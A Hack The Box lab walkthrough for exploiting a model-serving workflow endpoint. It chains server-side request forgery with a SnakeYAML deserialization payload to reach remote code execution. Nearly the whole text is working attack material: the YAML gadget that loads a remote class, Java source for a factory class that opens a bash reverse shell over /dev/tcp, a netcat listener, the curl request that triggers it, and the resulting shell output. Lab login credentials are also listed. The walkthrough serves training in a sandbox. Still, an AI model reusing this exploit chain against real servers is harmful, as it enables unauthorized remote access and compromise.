# NOTE: This must be done in ParrotOS

## Creds

| Name | Age |
|------|-----|
| htb-stdnt | 4c4demy_Studen7 |


Spawn the target and SSH in with the HTB standard credentials updating the STMIP to the lab IP and the **STMPO** to the lab port. Assign a port to watch for execution and update the **PWNPO** to match(ex. 9001)

```
ssh htb-stdnt@STMIP -p STMPO -R 8000:127.0.0.1:8000 -R PWNPO:127.0.0.1:PWNPO -L 8081:127.0.0.1:8081 -N
```

## Install torch-workflow-archiver
```
pip3 install torch-workflow-archiver
```

## Execution

1. Create **handler.py**
```
cat << EOF > handler.py
def initialize(self, context):
	self.model = self.load_model()
EOF
``` 
2. Create a **spec.yaml** file
```
echo '!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1:8000/"]]]]' > spec.yaml
```
3. Create a **.war** file **torch-workflow-archiver**
```
torch-workflow-archiver --workflow-name student --spec-file spec.yaml --handler handler.py
```

4. provide Java **MyScriptEngineFactory.java** making sure to update the *PWNPO* to match the above port chosen. 

```
package exploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class MyScriptEngineFactory implements ScriptEngineFactory {

    public MyScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/127.0.0.1/PWNPO 0>&1");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}

```

5. Compile the updated payload/expliot:

```
javac MyScriptEngineFactory.java
```

6. Create the **META-INF/services** directory. An **exploit** directory, and **javax.script.ScriptEngineFactory** file.

```
mkdir -p META-INF/services
mkdir exploit
echo 'exploit.MyScriptEngineFactory' > META-INF/services/javax.script.ScriptEngineFactory
mv MyScriptEngineFactory.class exploit/
```

7. Start a Simple HTTP Server 

```
python3 -m http.server 8000
```

8. Start a  netcat listener on the **PWNPO** chosen above

```
nc -nvlp PWNPO
```

9. open another terminal tab and perform the Server Side Request Forgery (SSRF) to Remote Code Execution (RCE) by sending a POST request to the /workflows endpoint and specifying the /student.war file

```
curl -X POST http://127.0.0.1:8081/workflows?url=http://127.0.0.1:8000/student.war
```

Results: 

```
{
  "code": 500,
  "type": "ClassCastException",
  "message": "class javax.script.ScriptEngineManager cannot be cast to class java.util.Map (javax.script.ScriptEngineManager is in module java.scripting of loader 'platform'; java.util.Map is in module java.base of loader 'bootstrap')"
}
```
On the Netcat tab:

```
listening on [any] 9001 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 46966
bash: cannot set terminal process group (8): Not a tty
bash: no job control in this shell
ng-8414-aiappsystemmdt-serri-8448b6b595-gbw66:/#
```
10. Look at the directory, and print flag details. 

```
ls
cat flag_XXXXXXXXX.txt
```